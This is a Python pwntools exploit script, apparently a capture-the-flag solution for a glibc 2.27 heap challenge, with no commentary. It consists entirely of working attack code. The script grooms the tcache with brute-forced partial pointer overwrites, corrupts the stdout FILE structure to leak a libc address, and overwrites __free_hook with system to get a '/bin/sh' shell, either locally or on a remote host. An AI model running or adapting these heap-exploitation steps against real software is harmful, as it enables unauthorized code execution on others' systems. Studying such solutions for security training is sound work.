import sys
import random
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try:
		if len(sys.argv)==1 :
			io=process('./pwn')
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
		else :
			io=remote('39.97.182.233',34326)
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

		def add(a,b):
			io.sendlineafter('>> ','1')
			io.sendlineafter('Size?\n',str(a))
			io.sendafter('Content?\n',b)

		def delete():
			io.sendlineafter('>> ','2')

		def a666():
			io.sendlineafter('>> ','666')

		add(0x68, 'n')
		delete()
		add(0x18, 'n')
		add(0, '')
		add(0x48, 'n')
		delete()
		add(0, '')

		heap_two_byte = random.randint(0, 0xf) * 0x1000 + 0x0010

		log.info('heap_two_byte: ' + hex(heap_two_byte))
		# add(0x68, 'a' * 0x18 + p64(0x201) + p16(0x7010))
		add(0x68, 'a' * 0x18 + p64(0x201) + p16(heap_two_byte))
		add(0, '')
		add(0x48, 'n')
		add(0, '')

		# io.sendlineafter('>> ', '666')
		add(0x48, '\xff' * 0x40)
		# add(0x58, 'a' * 0x18 + '' * 0x20 + p64(0x1f1) + p16(0x7050))
		add(0x58, 'a' * 0x18 + '' * 0x20 + p64(0x1f1) + p16(heap_two_byte + 0x40))
		add(0, '')

		add(0x18, p64(0) + p64(0))
		add(0, '')
		two_byte = random.randint(0, 0xf) * 0x1000 + 0x0760
		log.info('two_byte: ' + hex(two_byte))
		# add(0x1e8, p64(0) * 4 + 'x60x07xdd')
		add(0x1e8, p64(0) * 4 + p16(two_byte))
		add(0, '')

		add(0x58, p64(0xfbad2887 | 0x1000) + p64(0) * 3 +p8(0xc8))

		result = io.recvn(8)
		libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
		log.success('libc_addr: ' + hex(libc_addr))
		io.sendlineafter('>> ', '666')
		add(0x1e8, 'a' * 0x18 + p64(libc_addr + libc.symbols['__free_hook'] - 8))
		add(0, '')
		add(0x48, '/bin/sh' + p64(libc_addr + libc.symbols['system']))
		io.sendlineafter('>> ', '1')
		io.sendlineafter('?\n', str(0))

	except EOFError :
		io.close()

	else :
		pause()
		io.interactive()
